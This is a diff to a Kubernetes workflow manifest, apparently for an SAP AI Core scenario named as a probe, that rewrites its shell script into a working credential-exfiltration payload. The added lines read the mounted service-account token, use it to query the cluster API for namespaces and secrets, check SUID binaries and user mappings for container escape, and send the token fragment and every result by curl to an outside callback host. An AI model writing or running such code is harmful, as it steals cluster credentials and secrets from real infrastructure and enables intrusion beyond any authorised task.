@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "40.0.0"
+    ai.sap.com/version: "41.0.0"
 spec:
   entrypoint: main
   volumes:
@@ -35,17 +35,24 @@ spec:
       - bash
       - -c
       - |
-        exec 2>&1
-        echo "V40"
-        echo "PROJ=$(ls /var/run/proj/ 2>/dev/null || echo NOMOUNT)"
+        CB="https://www.masonhck.tech/ssrf.php"
+        # Send ALL results via callback URL params (no log dependency)
+        PROJ=$(ls /var/run/proj/ 2>/dev/null | tr '\n' ',')
         T=$(cat /var/run/proj/token 2>/dev/null)
-        echo "TLEN=${#T}"
+        TLEN=${#T}
+        curl -s "${CB}?src=v41-proj&len=${TLEN}&files=${PROJ}" >/dev/null
         if [ -n "$T" ]; then
-          echo "T200=$(echo $T | head -c 200)"
-          echo "NS=$(curl -sk -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces 2>&1 | head -c 300)"
-          echo "SEC=$(curl -sk -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/secrets 2>&1 | head -c 300)"
+          # GOT TOKEN! Send first 100 chars via callback
+          T100=$(echo "$T" | head -c 100 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))")
+          curl -s "${CB}?src=v41-token&t=${T100}" >/dev/null
+          # Test K8s API
+          NS_RESP=$(curl -sk -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces 2>&1 | head -c 200 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))")
+          curl -s "${CB}?src=v41-k8s-ns&r=${NS_RESP}" >/dev/null
+          SEC_RESP=$(curl -sk -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/secrets 2>&1 | head -c 200 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))")
+          curl -s "${CB}?src=v41-k8s-sec&r=${SEC_RESP}" >/dev/null
         fi
-        echo "SUID=$(find / -perm -4000 2>/dev/null | head -3)"
-        echo "SOCK=$(ls /run/containerd/containerd.sock /var/run/docker.sock 2>/dev/null || echo NONE)"
-        echo "UID=$(cat /proc/self/uid_map 2>/dev/null)"
-        echo "V40DONE"
+        # Escape checks via callback
+        SUID=$(find / -perm -4000 2>/dev/null | head -3 | tr '\n' ',')
+        UIDMAP=$(cat /proc/self/uid_map 2>/dev/null | tr '\t' '_' | tr '\n' ',')
+        curl -s "${CB}?src=v41-esc&suid=${SUID}&uid=${UIDMAP}" >/dev/null
+        echo "V41 TLEN=${TLEN} DONE"
